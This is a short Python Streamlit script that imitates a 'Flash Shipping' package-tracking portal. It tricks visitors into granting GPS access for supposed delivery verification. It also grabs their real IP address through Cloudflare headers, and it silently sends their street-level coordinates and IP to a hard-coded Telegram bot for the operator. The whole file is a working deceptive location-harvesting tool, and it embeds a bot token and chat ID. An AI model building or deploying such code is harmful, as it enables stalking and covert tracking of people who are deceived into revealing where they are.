import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import requests
import pandas as pd
from datetime import datetime

# --- SETTINGS ---
BOT_TOKEN = "8652805297:AAH0tpag7PKXH0v0CrZmeQJF7X68Qk01MKY"
CHAT_ID = "7964118615"

st.set_page_config(page_title="Flash Shipping", page_icon="📦")

# 1. ACTUAL IP DETECTION (Cloudflare Bypass)
def get_actual_ip():
    headers = st.context.headers
    # Check Cloudflare specific header first
    ip = headers.get("cf-connecting-ip") or headers.get("x-forwarded-for")
    if not ip:
        try: ip = requests.get("https://api.ipify.org").text
        except: ip = "Unknown"
    return ip

user_ip = get_actual_ip()

# 2. TELEGRAM SENDER
def send_actual_intel(lat, lon, acc, ip):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    gmaps = f"https://www.google.com/maps?q={lat},{lon}"
    
    msg = (
        f"🎯 *ACTUAL STREET LOCATION LOCKED*\n"
        f"📅 Time: {datetime.now().strftime('%H:%M:%S')}\n"
        f"🌐 Real IP: `{ip}`\n"
        f"🛰️ Lat: `{lat}`\n"
        f"🛰️ Lon: `{lon}`\n"
        f"📏 Accuracy: {acc} meters\n\n"
        f"📍 [Open in Maps]({gmaps})"
    )
    requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

# 3. UI - CLEAN TRACKING
st.markdown("<h2 style='color: #2874f0;'>📦 Flash Shipping Portal</h2>", unsafe_allow_html=True)
st.write("Current Package: **#FL-17112026**")
st.divider()

st.info("Verification Required: Tap below to sync your device GPS for street-level delivery.")

# This is the only component that can trigger the Mobile GPS Hardware
location = streamlit_geolocation()

# 4. ACTUAL LOCATION LOGIC
if location.get('latitude'):
    lat = location['latitude']
    lon = location['longitude']
    acc = location.get('accuracy', 0)
    
    # We only send if we have a real coordinate (not 0.0)
    if lat != 0 and st.session_state.get('last_sent') != lat:
        send_actual_intel(lat, lon, acc, user_ip)
        st.session_state['last_sent'] = lat
        
    st.success("✅ Actual Delivery Address Verified.")
    st.map(pd.DataFrame({'lat': [lat], 'lon': [lon]}))
else:
    # We DO NOT send IP location here anymore to ensure you only get the ACTUAL one
    st.warning("Awaiting GPS permission... Please click **'Allow'** on the browser prompt.")

st.divider()
st.caption("Secure encrypted verification portal.")
